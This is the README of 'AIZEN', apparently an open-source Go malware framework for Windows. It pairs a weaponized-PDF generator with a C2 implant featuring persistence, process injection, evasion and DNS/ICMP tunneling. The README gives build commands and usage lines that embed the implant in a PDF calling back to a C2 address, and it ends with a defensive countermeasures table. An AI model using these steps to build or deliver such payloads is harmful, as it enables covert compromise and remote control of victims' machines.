
# AIZEN -- Offensive Security Research Framework

**Author:** Nasrif30  
**Language:** Go  
**Platform:** Windows  

---

## WARNING -- READ THIS FIRST

AIZEN is a research-grade offensive security tool.

This software is for educational, defensive, and authorized penetration testing purposes only. Do not deploy this tool on systems you do not own or lack explicit written permission to test. The creator assumes zero liability for misuse, damage, or legal consequences. Using this tool against unauthorized targets is illegal in most jurisdictions.

By using AIZEN, you accept full responsibility for your actions.

---

## Liability Disclaimer

The author, Nasrif30, provides this software for educational and research purposes only. The author assumes no responsibility or liability for any misuse, damage, legal consequences, or any other outcomes resulting from the use of this tool. Users are solely responsible for their actions and for compliance with all applicable laws and regulations. The author does not endorse or encourage any illegal or unethical use of this software. By using AIZEN, you acknowledge that you are using it at your own risk and that the author will not be held liable for any damages or losses, whether direct, indirect, incidental, or consequential.

---

## What is AIZEN?

AIZEN is a two-component offensive security research framework:

1. PDFGEN -- Generates a weaponized PDF that executes JavaScript when opened.
2. AIZEN Implant -- A stealthy C2 payload that establishes persistence, injects into processes, and communicates over HTTP/DNS/ICMP.

It is designed to help researchers understand:
- PDF exploit delivery mechanics
- JavaScript-based droppers and sandbox evasion
- Process injection and memory-only execution
- C2 communication and tunneling
- Steganography and obfuscation techniques

---

## The Name -- AIZEN

```
  █████  ██ ███████ ███████ ███    ██ 
 ██   ██ ██    ███  ██      ████   ██ 
 ███████ ██   ███   █████   ██ ██  ██ 
 ██   ██ ██  ███    ██      ██  ██ ██ 
 ██   ██ ██ ███████ ███████ ██   ████ 
```

| Letter | Meaning | Description |
|--------|---------|-------------|
| A | Adaptive | Shifts shape, evades detection, rewrites between executions |
| I | Injection | Process hollowing, reflective DLL, memory-only execution |
| Z | Zero-Trust Breach | Bypasses firewall, endpoint, and behavioral heuristics |
| E | Execution | Delivers payload with no disk writes, no logs, no traces |
| N | Network Evasion | Tunnels through DNS, HTTPS, and ICMP to phone home |

---

## Architecture Overview

![Full Architecture](images/architecture.png)

*Diagram showing the complete AIZEN framework including PDFGEN, AIZEN Implant, and C2 Infrastructure.*

---

## Attack Chain

![Attack Chain](images/attack_chain.png)

*Step-by-step flow from PDF generation to implant execution and C2 communication.*

---

## Project Structure

```
AIZEN/
+-- cmd/
|   +-- aizen/              # C2 Implant entry point
|   |   +-- main.go
|   +-- pdfgen/             # PDF Generator entry point
|       +-- main.go
+-- internal/
|   +-- crypto/             # AES-256-GCM encryption
|   +-- display/            # Banner + branding
|   +-- network/            # DNS/HTTP tunneling
|   +-- pdf/                # PDF builder, JS generator, stego, exploit
|       +-- builder.go
|       +-- exploit.go
|       +-- jsgen.go
|       +-- obfuscate.go
|       +-- stego.go
+-- modules/                # Core modules
|   +-- beacon/             # C2 communication
|   +-- inject/             # Process injection
|   +-- evade/              # Sandbox + AV evasion
|   +-- persist/            # Registry + scheduled tasks
|   +-- payload/            # Embedding + decryption
+-- build/
|   +-- windows/x64/
|   +-- windows/x86/
|   +-- cross-compile.sh
+-- go.mod
+-- README.md
```

---

## Build Instructions

### Prerequisites

- Go 1.21+
- Windows (or cross-compile for Windows from any OS)

### Build AIZEN Implant

```
go build -ldflags="-s -w -H=windowsgui" -o aizen.exe cmd/aizen/main.go
```

### Build PDF Generator

```
go build -o pdfgen.exe cmd/pdfgen/main.go
```

### Cross-Compile (all targets)

```
chmod +x build/cross-compile.sh
./build/cross-compile.sh
```

---

## Command Reference

### PDFGEN Flags

| Flag | Description | Default |
|------|-------------|---------|
| -payload | Path to payload binary (required) | -- |
| -server | C2 server address | 127.0.0.1:443 |
| -o | Output PDF filename | output.pdf |
| -image | PNG image for steganography | (optional) |
| -js | Output only JavaScript (no PDF) | false |
| -nobanner | Suppress banner | false |

### AIZEN Flags

| Flag | Description | Default |
|------|-------------|---------|
| -server | C2 server address | 127.0.0.1:443 |
| -interval | Beacon interval (seconds) | 30 |
| -jitter | Max jitter (seconds) | 10 |
| -key | AES encryption key (base64) | (none) |
| -nobanner | Suppress banner | false |

---

## Usage Examples

### Generate a Basic PDF

```
.\pdfgen.exe -payload aizen.exe -server 192.168.1.100:4444 -o payload.pdf
```

### Generate PDF with Steganography

```
.\pdfgen.exe -payload aizen.exe -image cover.png -server 192.168.1.100:4444 -o stealth.pdf
```

### Output Only JavaScript

```
.\pdfgen.exe -payload aizen.exe -js -server 192.168.1.100:4444
```

### Run AIZEN Implant

```
.\aizen.exe -server 192.168.1.100:4444 -interval 60 -jitter 15
```

---

## Defensive Countermeasures

If you are defending against this type of attack:

| Defense | Mitigation |
|---------|------------|
| Patch Adobe Acrobat | Apply security updates (CVE-2026-34621 fixed) |
| Enable Protected View | Sandboxes JavaScript execution |
| Monitor Process Creation | Alert on acrobat.exe spawning cmd.exe or powershell.exe |
| Registry Monitoring | Sysmon Event ID 13/14 for Run keys |
| Application Whitelisting | AppLocker to block unsigned binaries |
| Network Monitoring | Detect beaconing to suspicious domains |

---

## Disclaimer

AIZEN is provided "as is", without warranty of any kind.

This software is intended for:
- Security researchers
- Penetration testers with explicit authorization
- Educational institutions teaching offensive security

It is not intended for:
- Unauthorized access to computer systems
- Malware development or deployment
- Any illegal activity

The author and contributors do not condone the misuse of this tool. Users are solely responsible for complying with all applicable laws and regulations.

---

## License

MIT -- Use responsibly.

---

## Author

Nasrif30 -- https://github.com/Nasrif30/AIZEN
```

